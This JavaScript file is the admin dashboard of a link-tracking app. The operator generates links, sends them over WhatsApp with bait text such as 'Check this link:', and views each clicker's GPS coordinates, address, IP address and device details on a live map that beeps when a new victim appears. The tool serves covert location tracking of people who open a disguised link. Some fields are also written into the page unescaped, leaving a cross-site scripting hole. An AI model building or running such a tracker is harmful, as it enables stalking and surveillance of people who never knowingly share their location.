document.addEventListener('DOMContentLoaded', function() {
    // Nav elements
    const navItems = document.querySelectorAll('.nav-item:not(.logout-link)');
    const sections = document.querySelectorAll('.tab-section');
    const pageTitle = document.getElementById('page-title');
    const hamburgerBtn = document.getElementById('hamburger-btn');
    const sidebar = document.getElementById('sidebar');
    const sidebarOverlay = document.getElementById('sidebar-overlay');

    // Stats
    const statLocations = document.getElementById('stat-locations');
    const statLinks = document.getElementById('stat-links');
    const statActive = document.getElementById('stat-active');

    // Generate elements
    const linkLabelInput = document.getElementById('link-label');
    const generateBtn = document.getElementById('generate-btn');
    const generationResult = document.getElementById('generation-result');
    const resultLinkUrl = document.getElementById('result-link-url');
    const copyLinkBtn = document.getElementById('copy-link-btn');
    const whatsappShareBtn = document.getElementById('whatsapp-share-btn');

    // Lists
    const locationsList = document.getElementById('locations-list');
    const linksList = document.getElementById('links-list');

    // Map & Audio context variables
    let map = null;
    let markersLayer = null;
    let lastLocationsCount = -1;

    // Navigation and Menu
    navItems.forEach(item => {
        item.addEventListener('click', function(e) {
            e.preventDefault();
            const targetId = this.getAttribute('data-target');
            
            navItems.forEach(nav => nav.classList.remove('active'));
            this.classList.add('active');

            sections.forEach(sec => sec.classList.remove('active'));
            document.getElementById(targetId).classList.add('active');

            pageTitle.textContent = this.textContent.trim();

            // Close sidebar on mobile
            sidebar.classList.remove('open');
            sidebarOverlay.classList.remove('open');
            hamburgerBtn.classList.remove('open');

            // Force map recalculation if active
            if (targetId === 'dashboard-section' && map) {
                setTimeout(() => map.invalidateSize(), 200);
            }
        });
    });

    hamburgerBtn.addEventListener('click', function() {
        this.classList.toggle('open');
        sidebar.classList.toggle('open');
        sidebarOverlay.classList.toggle('open');
    });

    sidebarOverlay.addEventListener('click', function() {
        this.classList.remove('open');
        sidebar.classList.remove('open');
        hamburgerBtn.classList.remove('open');
    });

    // Sound alert function
    function playBeepSound() {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();

            oscillator.connect(gainNode);
            gainNode.connect(audioCtx.destination);

            oscillator.type = 'sine';
            oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); // A5 frequency
            
            gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
            gainNode.gain.linearRampToValueAtTime(0.3, audioCtx.currentTime + 0.05);
            gainNode.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.3);

            oscillator.start(audioCtx.currentTime);
            oscillator.stop(audioCtx.currentTime + 0.3);
        } catch (e) {
            console.error('Audio beep failed', e);
        }
    }

    // Initialize Map
    function initMap() {
        if (!document.getElementById('map')) return;
        map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
            attribution: '&copy; OpenStreetMap contributors &copy; CARTO'
        }).addTo(map);
        markersLayer = L.layerGroup().addTo(map);
    }

    // Fetch and Populate Dashboard / Map / Table
    async function loadData() {
        try {
            // Stats
            const statsRes = await fetch('/api/stats');
            if (statsRes.ok) {
                const stats = await statsRes.json();
                statLocations.textContent = stats.total_locations;
                statLinks.textContent = stats.total_links;
                statActive.textContent = stats.active_links;
            }

            // Locations list & Map updates
            const locRes = await fetch('/api/locations');
            if (locRes.ok) {
                const locations = await locRes.json();

                // Beep if count increases
                if (lastLocationsCount !== -1 && locations.length > lastLocationsCount) {
                    playBeepSound();
                }
                lastLocationsCount = locations.length;

                // Update Table
                locationsList.innerHTML = '';
                if (markersLayer) markersLayer.clearLayers();
                const mapPoints = [];

                locations.forEach((loc, index) => {
                    const row = document.createElement('tr');
                    row.className = 'animate-fade';
                    
                    const latLngCol = loc.location_denied 
                        ? '<span class="location-denied-badge">Location Denied</span>' 
                        : `${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}`;

                    row.innerHTML = `
                        <td>${index + 1}</td>
                        <td><strong>${escapeHtml(loc.label)}</strong></td>
                        <td>${loc.timestamp}</td>
                        <td>${loc.location_denied ? '<span class="text-muted">Location Denied</span>' : escapeHtml(loc.city || 'Unknown') + ', ' + escapeHtml(loc.address || 'Unknown')}</td>
                        <td>${latLngCol}</td>
                        <td><code>${loc.ip_address}</code></td>
                        <td><span style="font-size: 0.8rem;" title="${escapeHtml(loc.user_agent)}">${loc.platform} (${loc.screen_resolution})</span></td>
                        <td>${loc.accuracy ? loc.accuracy.toFixed(1) + ' m' : 'N/A'}</td>
                        <td>
                            <button class="btn btn-danger btn-xs delete-loc-btn" data-id="${loc.id}">Delete</button>
                        </td>
                    `;
                    locationsList.appendChild(row);

                    // Add Marker to Map if not denied
                    if (!loc.location_denied && loc.latitude && loc.longitude) {
                        const markerLatLng = [loc.latitude, loc.longitude];
                        mapPoints.push(markerLatLng);

                        const popupContent = `
                            <div class="map-popup">
                                <h4>${escapeHtml(loc.label)}</h4>
                                <p><strong>City:</strong> ${escapeHtml(loc.city || 'Unknown')}</p>
                                <p><strong>Time:</strong> ${loc.timestamp}</p>
                                <p><strong>IP:</strong> ${loc.ip_address}</p>
                                <p><strong>Device:</strong> ${loc.platform}</p>
                            </div>
                        `;

                        L.marker(markerLatLng).addTo(markersLayer).bindPopup(popupContent);
                    }
                });

                // Auto fit map
                if (map && mapPoints.length > 0) {
                    map.fitBounds(mapPoints, { padding: [50, 50], maxZoom: 15 });
                }

                // Attach delete listeners
                document.querySelectorAll('.delete-loc-btn').forEach(btn => {
                    btn.addEventListener('click', async function() {
                        if (confirm('Delete this location entry?')) {
                            const id = this.getAttribute('data-id');
                            const delRes = await fetch(`/api/locations/${id}`, { method: 'DELETE' });
                            if (delRes.ok) {
                                loadData();
                            }
                        }
                    });
                });
            }

            // Links list
            const linksRes = await fetch('/api/links');
            if (linksRes.ok) {
                const links = await linksRes.json();
                linksList.innerHTML = '';
                links.forEach(link => {
                    const row = document.createElement('tr');
                    row.className = 'animate-fade';
                    const fullUrl = `${window.location.origin}/t/${link.link_id}`;

                    row.innerHTML = `
                        <td><strong>${escapeHtml(link.label)}</strong></td>
                        <td>${link.created_at}</td>
                        <td>${link.visit_count}</td>
                        <td>
                            <label class="switch">
                                <input type="checkbox" class="toggle-link-status" data-id="${link.link_id}" ${link.is_active ? 'checked' : ''}>
                                <span class="slider"></span>
                            </label>
                        </td>
                        <td><input type="text" class="link-url-input" value="${fullUrl}" readonly style="background:transparent; border:none; width:100%; color:var(--text-muted);" onclick="this.select()"></td>
                        <td>
                            <button class="btn btn-secondary btn-xs copy-row-btn" data-url="${fullUrl}">Copy</button>
                            <a href="https://wa.me/?text=${encodeURIComponent('Check this link: ' + fullUrl)}" target="_blank" class="btn btn-success btn-xs">WhatsApp</a>
                            <button class="btn btn-danger btn-xs delete-link-btn" data-id="${link.link_id}">Delete</button>
                        </td>
                    `;
                    linksList.appendChild(row);
                });

                // Attach actions for links table
                document.querySelectorAll('.toggle-link-status').forEach(checkbox => {
                    checkbox.addEventListener('change', async function() {
                        const linkId = this.getAttribute('data-id');
                        const is_active = this.checked;
                        await fetch(`/api/links/${linkId}`, {
                            method: 'PUT',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ is_active })
                        });
                        loadData();
                    });
                });

                document.querySelectorAll('.copy-row-btn').forEach(btn => {
                    btn.addEventListener('click', function() {
                        const url = this.getAttribute('data-url');
                        navigator.clipboard.writeText(url);
                        const origText = this.textContent;
                        this.textContent = 'Copied!';
                        setTimeout(() => this.textContent = origText, 1500);
                    });
                });

                document.querySelectorAll('.delete-link-btn').forEach(btn => {
                    btn.addEventListener('click', async function() {
                        if (confirm('Delete this campaign link? All related locations will also be deleted.')) {
                            const linkId = this.getAttribute('data-id');
                            const delRes = await fetch(`/api/links/${linkId}`, { method: 'DELETE' });
                            if (delRes.ok) {
                                loadData();
                            }
                        }
                    });
                });
            }

        } catch (err) {
            console.error('Error fetching admin data', err);
        }
    }

    // Helper to escape HTML characters
    function escapeHtml(text) {
        if (!text) return '';
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return text.replace(/[&<>"']/g, m => map[m]);
    }

    // Generate Link Click Handler
    if (generateBtn) {
        generateBtn.addEventListener('click', async function() {
            const label = linkLabelInput.value.trim();
            if (!label) {
                alert('Please enter a label for the link');
                return;
            }

            const genRes = await fetch('/api/links/generate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ label })
            });

            if (genRes.ok) {
                const linkInfo = await genRes.json();
                const fullUrl = `${window.location.origin}/t/${linkInfo.link_id}`;
                
                resultLinkUrl.value = fullUrl;
                whatsappShareBtn.href = `https://wa.me/?text=${encodeURIComponent('Check this: ' + fullUrl)}`;
                
                generationResult.classList.remove('hidden');
                linkLabelInput.value = '';
                
                loadData();
            } else {
                alert('Failed to generate tracking link');
            }
        });
    }

    // Copy Generated Link Button
    if (copyLinkBtn) {
        copyLinkBtn.addEventListener('click', function() {
            resultLinkUrl.select();
            navigator.clipboard.writeText(resultLinkUrl.value);
            const origText = this.textContent;
            this.textContent = 'Copied!';
            setTimeout(() => this.textContent = origText, 1500);
        });
    }

    // Initializations
    initMap();
    loadData();

    // Auto-refresh schedule every 15 seconds
    setInterval(loadData, 15000);
});
